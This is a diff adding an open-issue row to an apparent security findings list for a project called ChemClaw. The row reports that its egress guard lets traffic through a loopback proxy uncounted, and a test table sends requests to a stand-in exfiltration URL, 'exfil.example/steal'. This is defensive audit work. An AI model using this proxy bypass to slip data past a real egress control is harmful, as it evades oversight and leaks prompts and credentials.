@@ -87,6 +87,39 @@ topic).
   env var somebody else set. That residual case, plus the guard being disableable
   (`CHEMCLAW_EGRESS_GUARD_ENABLED=false`), is what keeps this row open.
 
+- [ ] **A loopback proxy is outside the egress guard by construction, and a service mesh is exactly
+  that shape** — [M], opened 2026-09-05 by the pass that unified the two loopback predicates onto
+  `core/http.is_loopback_host`. The row above measured that a *named* proxy is refused and
+  concluded the guard is "a partial mitigation"; the half it did not measure is that a proxy on
+  **loopback needs no allowlisting at all**, because `netguard._check` exempts loopback by
+  construction — and must keep exempting it, since the process dials Postgres, Temporal and the
+  calc backend there. Measured with the allowlist deliberately empty, one local HTTP proxy and
+  `httpx` (`_refused` read off the module after each arm):
+
+  | arm | outcome | `netguard._refused` |
+  | --- | --- | --- |
+  | `proxy=http://proxy.corp:3128` → `http://exfil.example/steal` | refused at `getaddrinfo` | 1 |
+  | `proxy=http://127.0.0.1:<port>` → `http://exfil.example/steal` | **HTTP 200, body returned** | **0** |
+  | no proxy → `http://exfil.example/steal` (the control) | refused at `getaddrinfo` | 1 |
+
+  The middle arm is the finding: the request reached its external destination end to end, and the
+  counter never moved — so nothing logs at ERROR, nothing alerts, and `chemclaw_egress_refused_total`
+  reads as a clean pod. This is the *shipped* topology rather than an attacker-only one: an
+  OpenShift service mesh or egress sidecar is a loopback proxy by design, so
+  `HTTPS_PROXY=http://127.0.0.1:15001` on the pod re-terminates TLS for every prompt, completion
+  and `Authorization` bearer and forwards them wherever the sidecar is configured to.
+  `core/http.private_ca_transport` sets `trust_env=False` and closes it for the two LLM seams that
+  take it — on the CA-bundle branch only (the row above), and for no other `httpx`/`requests`
+  client in the tree.
+
+  **Not fixable by widening the loopback answer**, which is why this is a row and not a patch: the
+  guard's model is "which *host* may this process dial", and a proxy moves the destination out of
+  the address entirely. Closing it means treating proxy configuration as a destination — reading
+  `HTTP(S)_PROXY`/`ALL_PROXY`/`NO_PROXY` at arm time and refusing, or requiring the proxy to be
+  named in `CHEMCLAW_EGRESS_ALLOW` even when it is loopback — which changes behaviour for every
+  deployment behind a legitimate mesh and wants the same ADR the `trust_env=False` half of the row
+  above is already deferred to.
+
 - [ ] **The gateway boot guard reaches one process, and the worker is the other one** — [M],
   opened by `D-2026-09-04-a-gateway-is-the-only-provider`. `_refuse_unconfigured_llm_gateway` and
   `_refuse_unauthenticated_exposure` are called only from `api/app.py`, so a background worker
